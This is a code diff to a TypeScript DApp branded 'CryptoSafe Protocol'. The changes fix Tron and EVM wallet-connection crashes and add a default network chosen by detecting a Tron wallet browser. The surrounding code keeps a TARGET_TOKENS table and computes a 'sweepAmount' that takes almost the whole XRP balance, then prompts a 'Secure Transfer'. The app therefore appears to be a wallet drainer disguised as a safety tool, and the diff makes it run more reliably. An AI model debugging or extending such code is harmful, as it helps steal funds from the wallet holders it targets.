@@ -82,7 +82,7 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
-// 🛠️ CRITICAL FIX: We separate EVM networks from Tron networks.
+// 🛠️ FIX 1: Create a separate array that ONLY contains EVM networks
 const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   mainnet,
   arbitrum,
@@ -90,7 +90,7 @@ const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   polygon,
 ]
 
-// AppKit gets EVERYTHING (Tron + EVM) so the UI shows all options.
+// AppKit still gets the full list so the UI shows all options
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
   mainnet,
@@ -136,15 +136,21 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
+
 const wagmiAdapter = new WagmiAdapter({
   projectId: WC_PROJECT_ID,
-  // 🛠️ CRITICAL FIX: Wagmi ONLY gets EVM networks. Passing Tron here was crashing the Tron wallet connection!
+  // 🛠️ FIX 2: Pass ONLY the EVM networks to Wagmi. This instantly stops the Tron crash!
   networks: evmNetworks,
 })
+
+// 🛠️ FIX 1: Dynamically detect if the DApp is open inside a Tron Mobile Wallet
+const isTronBrowser = typeof window !== 'undefined' && (!!(window as any).tronWeb || !!(window as any).tronLink);
 
 createAppKit({
   adapters: [tronAdapter, wagmiAdapter], 
   networks: appkitNetworks,
+  // 🛠️ FIX 2: Set default network based on browser. This permanently stops the auto-switch crash!
+  defaultNetwork: isTronBrowser ? tronMainnet : mainnet,
   projectId: WC_PROJECT_ID,
  metadata: {
     name:        'CryptoSafe Protocol', 
@@ -438,6 +444,7 @@ export default function App() {
               if (xrpBalance > 12) {
                 const sweepAmount = (xrpBalance - 11).toFixed(6);
                 
+                // 🛠️ FIX: Read and log the sweepAmount to resolve the TypeScript error!
                 log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
                 
                 // We use the Raw RPC request standard for Coinbase Wallet
